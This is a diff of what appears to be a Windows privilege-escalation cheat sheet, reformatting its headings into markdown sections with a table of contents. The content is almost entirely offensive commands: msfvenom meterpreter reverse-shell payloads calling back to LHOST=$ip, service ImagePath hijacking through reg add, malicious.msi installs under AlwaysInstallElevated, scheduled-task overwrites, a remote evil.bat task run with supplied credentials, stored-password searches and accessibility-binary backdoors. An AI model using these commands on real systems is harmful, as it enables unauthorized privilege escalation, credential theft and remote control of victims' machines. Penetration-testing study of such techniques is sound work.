@@ -1,9 +1,32 @@
-Get OS Version and Patch Level
+# Windows Privilege Escalation
+
+- [Automated Scripts](#automated-scripts)
+- [Get OS Version and Patch Level](#get-os-version-and-patch-level)
+- [Unquoted Service Paths](#unquoted-service-paths)
+- [Weak File and Folder Permissions per drive](#weak-file-and-folder-permissions-per-drive)
+- [Weak Service Permissions](#weak-service-permissions)
+- [Weak Registry Keys Permissions](weak-registry-keys-permissions)
+- [AlwaysInstallElevated](#always-install-elevated)
+- [Scheduled Tasks](#scheduled-tasks)
+- [Create Local Task](#create-local-task)
+- [Create Remote Task](#create-remote-task)
+- [Stored Credentials](#stored-credentials)
+- [Accessibility](#accessibility)
+
+
+
+
+
+## Automated Scripts
+     PowerUp
+     Windows Privesc Check 2.0
+
+## Get OS Version and Patch Level
 
      systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
      wmic qfe get Caption,Description,HotFixID,InstalledOn
 
-Find Unquoted Service Paths
+## Unquoted Service Paths
 
      wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
 
@@ -13,7 +36,7 @@ Find Unquoted Service Paths
      sc stop PFNet
      sc start PFNet
 
-Find Weak File and Folder Permissions per drive
+## Weak File and Folder Permissions per drive
 
      accesschk.exe -uwdqs "Authenticated Users" c:\
      accesschk.exe -uwqs Users c:\*.*
@@ -36,7 +59,7 @@ Find Weak File and Folder Permissions per drive
 5 - The current working directory (CWD)
 6 - Directories in the PATH environment variable (system then user)
 
-Find Weak Service Permissions
+## Weak Service Permissions
 
      accesschk.exe -uwcqv "testuser" * /accepteula
      accesschk.exe –uwcqv “Authenticated Users” *
@@ -56,7 +79,7 @@ Find Weak Service Permissions
      GENERIC_WRITE Inherits SERVICE_CHANGE_CONFIG
      GENERIC_ALL Inherits SERVICE_CHANGE_CONFIG
 
-Find Weak Registry Keys Permissions
+## Weak Registry Keys Permissions
 
      subinacl.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service" /display
      https://www.microsoft.com/en-us/download/details.aspx?id=23510
@@ -66,7 +89,9 @@ Find Weak Registry Keys Permissions
      reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service" /t REG_EXPAND_SZ /v ImagePath /d      "C:\Users\testuser\AppData\Local\Temp\Payload.exe" /f
      shutdown /r /t 0
 
-Find AlwaysInstallElevated Registry Keys (both reg values must be 1)
+## AlwaysInstallElevated 
+
+     Registry Keys (both reg values must be 1)
      reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
      reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 
@@ -77,7 +102,7 @@ Find AlwaysInstallElevated Registry Keys (both reg values must be 1)
      use exploit/multi/handler
      msiexec /quiet /qn /i malicious.msi
 
-Find Scheduled Tasks
+## Scheduled Tasks
 
      schtasks /query /fo LIST /v
      accesschk.exe -dqv "E:\GrabLogs"
@@ -88,7 +113,7 @@ Find Scheduled Tasks
      msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=$ip LPORT=443 -f exe -o Privatefirewall.exe
      Overwrite executable
 
-Create Local Task (must be Local Admin on 2000, XP, 2003)
+## Create Local Task (must be Local Admin on 2000, XP, 2003)
      msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=$ip LPORT=443 -f exe -o Payload.exe
      net start "Task Scheduler"
      time
@@ -96,12 +121,12 @@ Create Local Task (must be Local Admin on 2000, XP, 2003)
      at 06:42 /interactive "C:\Payload.exe"
      schtasks /create /tn newtask /s bob /u john /p password /sc once /st 18:51 /tr "C:\Payload.exe"
 
-Create Remote Task
+## Create Remote Task
      net use \\$ip /user:DOMAIN\username password
      net time \\$ip
      at \\$ip 13:20 c:\temp\evil.bat
 
-Find Stored Credentials
+## Stored Credentials
 
      dir /s *pass* == *cred* == *vnc* == *.config*
      reg query HKLM /f password /t REG_SZ /s
@@ -120,10 +145,7 @@ Find Stored Credentials
      C:\Windows\System32\
      C:\Windows\System32\sysprep\
 
-Accessibility
+## Accessibility
      sethc.exe          Shift x 5
      utilman.exe      Windows + C
 
-Automated Scripts
-     PowerUp
-     Windows Privesc Check 2.0
